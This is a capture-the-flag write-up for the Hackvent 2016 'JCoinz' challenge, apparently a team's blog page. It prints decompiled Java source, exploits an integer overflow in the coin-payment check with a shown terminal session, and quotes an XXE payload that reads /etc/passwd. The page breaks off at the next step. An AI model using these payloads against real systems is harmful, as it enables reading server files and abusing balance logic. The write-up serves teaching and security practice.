@@ -1,0 +1,607 @@
+<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Dec 13: JCoinz" /><meta property="og:locale" content="en" /><meta name="description" content="A set of CTF writeups by team Galaxians." /><meta property="og:description" content="A set of CTF writeups by team Galaxians." /><link rel="canonical" href="https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/13-dec-13-jcoinz.html" /><meta property="og:url" content="https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/13-dec-13-jcoinz.html" /><meta property="og:site_name" content="Galaxians CTF" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Dec 13: JCoinz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","dateModified":"2023-05-20T16:28:47+02:00","description":"A set of CTF writeups by team Galaxians.","headline":"Dec 13: JCoinz","url":"https://shiltemann.github.io/CTF-writeups-public/writeups/Hackvent_2016/13-dec-13-jcoinz.html"}</script><title> Galaxians CTF | Dec 13: JCoinz</title><link rel="apple-touch-icon" sizes="180x180" href="/CTF-writeups-public/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/CTF-writeups-public/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/CTF-writeups-public/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/CTF-writeups-public/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/CTF-writeups-public/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Galaxians CTF"><meta name="application-name" content="Galaxians CTF"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/CTF-writeups-public/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/all.min.css"><link rel="stylesheet" href="/CTF-writeups-public/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.1/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/CTF-writeups-public/" class="mx-auto"> <img src="/CTF-writeups-public/assets/img/galaxians-logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/CTF-writeups-public/">Galaxians CTF</a></div><div class="site-subtitle font-italic">Galactic Girlfiends Hack the Universe!</div></div><ul class="w-100"><li class="nav-item"> <a href="/CTF-writeups-public/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>CTF EVENTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/posts/" class="nav-link"> <i class="fa-fw fas fa-pencil ml-xl-3 mr-xl-3 unloaded"></i> <span>POSTS</span> </a><li class="nav-item"> <a href="/CTF-writeups-public/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/shiltemann" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['galaxians','galaxians.org'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/CTF-writeups-public/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/CTF-writeups-public/"> Home </a> </span> <span><a href="/CTF-writeups-public/writeups/Hackvent_2016/">Hackvent 2016</a></span> <span>Dec 13: JCoinz</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Writeup</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1> Dec 13: JCoinz</h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><em>Sometimes less is more</em></p><p>The manager of jcoinz told a developer to implement a transaction tax as fast as possible so he can earn more money. Maybe that was a wrong decision…</p><p><code class="language-plaintext highlighter-rouge">nc challenges.hackvent.hacking-lab.com 3117</code></p><p><a href="writeupfiles/jcoinz.jar">jcoinz.jar</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We start by decompiling the jar file to get the <a href="writeupfiles/jcoinz_source">source files</a>.</p><p>Account.java:</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Account</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="nc">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">private</span> <span class="kt">int</span> <span class="n">coins</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getName</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setName</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">getCoins</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">coins</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setCoins</span><span class="o">(</span><span class="kt">int</span> <span class="n">coins</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">coins</span> <span class="o">=</span> <span class="n">coins</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">payCoins</span><span class="o">(</span><span class="kt">int</span> <span class="n">amount</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span> <span class="n">decreasedCoins</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getCoins</span><span class="o">()</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">"No more jcoinz!\n\n"</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">amount</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">amount</span> <span class="o">*=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">if</span> <span class="o">((</span><span class="n">decreasedCoins</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getCoins</span><span class="o">()</span> <span class="o">-</span> <span class="n">amount</span> <span class="o">-</span> <span class="nc">Shop</span><span class="o">.</span><span class="na">transactionTax</span><span class="o">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">"You cannot generate debts!\n\n"</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">setCoins</span><span class="o">(</span><span class="n">decreasedCoins</span><span class="o">);</span>
+        <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"-"</span><span class="o">,</span> <span class="s">"Decreased the account of \""</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\" by "</span> <span class="o">+</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">amount</span><span class="o">)</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">Account</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">coins</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">coins</span> <span class="o">=</span> <span class="n">coins</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>IO.java</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.InputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.PrintStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">IO</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">printStatus</span><span class="o">(</span><span class="nc">String</span> <span class="n">status</span><span class="o">,</span> <span class="nc">String</span> <span class="n">message</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"["</span> <span class="o">+</span> <span class="n">status</span> <span class="o">+</span> <span class="s">"] "</span> <span class="o">+</span> <span class="n">message</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Scanner</span> <span class="nf">getUserInput</span><span class="o">(</span><span class="nc">String</span> <span class="n">question</span><span class="o">)</span> <span class="o">{</span>
+        <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"?"</span><span class="o">,</span> <span class="n">question</span><span class="o">);</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="nf">Scanner</span><span class="o">(</span><span class="nc">System</span><span class="o">.</span><span class="na">in</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>Shop.java</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">javax.xml.transform.Source</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.Transformer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.TransformerFactory</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.dom.DOMSource</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.xml.transform.stream.StreamResult</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.w3c.dom.Document</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.w3c.dom.Node</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.xml.sax.SAXException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Shop</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">int</span> <span class="n">transactionTax</span> <span class="o">=</span> <span class="mi">2</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sendToAdmin</span><span class="o">(</span><span class="nc">Account</span> <span class="n">acc</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">acc</span><span class="o">.</span><span class="na">payCoins</span><span class="o">(</span><span class="mi">1337</span><span class="o">))</span> <span class="o">{</span>
+            <span class="nc">String</span> <span class="n">secretMessage</span> <span class="o">=</span> <span class="no">IO</span><span class="o">.</span><span class="na">getUserInput</span><span class="o">(</span><span class="s">"XML Message: "</span><span class="o">).</span><span class="na">nextLine</span><span class="o">();</span>
+            <span class="nc">DocumentBuilderFactory</span> <span class="n">xmlDocumentBuilderFactory</span> <span class="o">=</span> <span class="nc">DocumentBuilderFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="nc">DocumentBuilder</span> <span class="n">xmlDocumentBuilder</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="nc">Document</span> <span class="n">xmlDocument</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlDocumentBuilder</span> <span class="o">=</span> <span class="n">xmlDocumentBuilderFactory</span><span class="o">.</span><span class="na">newDocumentBuilder</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">ParserConfigurationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlDocument</span> <span class="o">=</span> <span class="n">xmlDocumentBuilder</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">secretMessage</span><span class="o">.</span><span class="na">getBytes</span><span class="o">()));</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">SAXException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="nc">TransformerFactory</span> <span class="n">xmlTransformerFactory</span> <span class="o">=</span> <span class="nc">TransformerFactory</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="nc">Transformer</span> <span class="n">xmlTransformer</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlTransformer</span> <span class="o">=</span> <span class="n">xmlTransformerFactory</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">TransformerConfigurationException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">xmlTransformer</span><span class="o">.</span><span class="na">setOutputProperty</span><span class="o">(</span><span class="s">"omit-xml-declaration"</span><span class="o">,</span> <span class="s">"yes"</span><span class="o">);</span>
+            <span class="nc">StringWriter</span> <span class="n">xmlWriter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringWriter</span><span class="o">();</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">xmlTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="k">new</span> <span class="nc">DOMSource</span><span class="o">(</span><span class="n">xmlDocument</span><span class="o">),</span> <span class="k">new</span> <span class="nc">StreamResult</span><span class="o">(</span><span class="n">xmlWriter</span><span class="o">));</span>
+            <span class="o">}</span>
+            <span class="k">catch</span> <span class="o">(</span><span class="nc">TransformerException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"+"</span><span class="o">,</span> <span class="s">"Your secret xml message: "</span> <span class="o">+</span> <span class="n">xmlWriter</span><span class="o">.</span><span class="na">getBuffer</span><span class="o">().</span><span class="na">toString</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n\n"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">sendToCharity</span><span class="o">(</span><span class="nc">Account</span> <span class="n">acc</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">acc</span><span class="o">.</span><span class="na">payCoins</span><span class="o">(</span><span class="no">IO</span><span class="o">.</span><span class="na">getUserInput</span><span class="o">(</span><span class="s">"Amount of jcoinz to send: "</span><span class="o">).</span><span class="na">nextInt</span><span class="o">()))</span> <span class="o">{</span>
+            <span class="no">IO</span><span class="o">.</span><span class="na">printStatus</span><span class="o">(</span><span class="s">"+"</span><span class="o">,</span> <span class="s">"Thank you very much!\n\n"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>MainRunner.java</p><div class="language-java highlighter-rouge"><div class="code-header"> <span data-label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.PrintStream</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainRunner</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">showWelcome</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"$$$$$$$$$$$$$$$$$$\n$ JCOINZ SERVICE $\n$$$$$$$$$$$$$$$$$$\n"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">showMenu</span><span class="o">(</span><span class="nc">Account</span> <span class="n">acc</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"1 - sends jcoinz to charity\n2 - send a secret xml message to the admin \nYour name: "</span> <span class="o">+</span> <span class="n">acc</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">"\n"</span> <span class="o">+</span> <span class="s">"Your amount of jcoinz: "</span> <span class="o">+</span> <span class="nc">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">acc</span><span class="o">.</span><span class="na">getCoins</span><span class="o">())</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="cm">/*
+     * Exception decompiling
+     */</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.</span>
+        <span class="c1">// org.benf.cfr.reader.util.CannotPerformDecode: reachable test BLOCK was exited and re-entered.</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.Misc.getFarthestReachableInRange(Misc.java:143)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.SwitchReplacer.examineSwitchContiguity(SwitchReplacer.java:385)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.analysis.opgraph.op3rewriters.SwitchReplacer.replaceRawSwitches(SwitchReplacer.java:65)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:423)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:217)</span>
+        <span class="c1">// org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:162)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:95)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.Method.analyse(Method.java:355)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:768)</span>
+        <span class="c1">// org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:700)</span>
+        <span class="c1">// org.benf.cfr.reader.Main.doJar(Main.java:134)</span>
+        <span class="c1">// org.benf.cfr.reader.Main.main(Main.java:189)</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalStateException</span><span class="o">(</span><span class="s">"Decompilation failed"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>We start with <code class="language-plaintext highlighter-rouge">1336</code> coins, and need <code class="language-plaintext highlighter-rouge">1337</code> in order to write an XML message to the admin (and presumably exploit that to find the nugget), but we can only give away coins, not add them..</p><p>The hint is <code class="language-plaintext highlighter-rouge">Sometimes less is more</code> ..so we think integer overflow; subtract so much we get positive integer again. For instance, we know that <code class="language-plaintext highlighter-rouge">System.out.println(-1 - Integer.MIN_VALUE)</code> gives as output <code class="language-plaintext highlighter-rouge">2147483647</code>. This is what we aim for, there are, however, a few limitations:</p><ol><li>If a negative number is entered, it is multiplied by -1<li>A tax is added to every transaction, 2 more coins than what you give away are subtracted from your total<li>If the result of the transaction would be a negative balance, it is not processed</ol><p>First, note that <code class="language-plaintext highlighter-rouge">-1*Integer.MIN_VALUE</code> is still <code class="language-plaintext highlighter-rouge">Integer.MIN_VALUE</code> so this circumvents the first limitation.</p><p>The tax will actually help us to get this done. As the result of our transactions can not be negative, we cannot get a balance of -1, which is what we would like so that we can subtract <code class="language-plaintext highlighter-rouge">INT_MIN</code>, but, if we first get our balance down to +1, then the tax will get us to -1 after which our value will be subtracted, and then we’re rich!</p><p>So we can do this in two transactions, first give away <code class="language-plaintext highlighter-rouge">1333</code> coins, and then we give away <code class="language-plaintext highlighter-rouge">Integer.INT_MIN</code> (<code class="language-plaintext highlighter-rouge">-2147483648</code>) coins, which with the added tax will give us the integer overflow we want.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>nc challenges.hackvent.hacking-lab.com 3117
+
+$$$$$$$$$$$$$$$$$$
+$ JCOINZ SERVICE $
+$$$$$$$$$$$$$$$$$$
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1336
+
+[?] Action: 1
+[?] Amount of jcoinz to send: 1333
+[-] Decreased the account of "billy" by 1333
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 1
+
+[?] Action: 1
+[?] Amount of jcoinz to send: -2147483648
+[-] Decreased the account of "billy" by -2147483648
+[+] Thank you very much!
+
+1 - sends jcoinz to charity
+2 - send a secret xml message to the admin
+Your name: billy
+Your amount of jcoinz: 2147483647
+</pre></table></code></div></div><p>Now we have enough coins to send an XML message! Now we need to figure out how to abuse this to read the flag from the server..</p><p>From Wikipedia entry on XXE exploits: <code class="language-plaintext highlighter-rouge">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</code> :</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+ &lt;!DOCTYPE foo [
+   &lt;!ELEMENT foo ANY &gt;
+   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</pre></table></code></div></div><p>to show contents of <code class="language-plaintext highlighter-rouge">/etc/passwd/</code>. Since we don’t know which file we need, we can adapt it to list contents of base directory</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre># list files in root directory
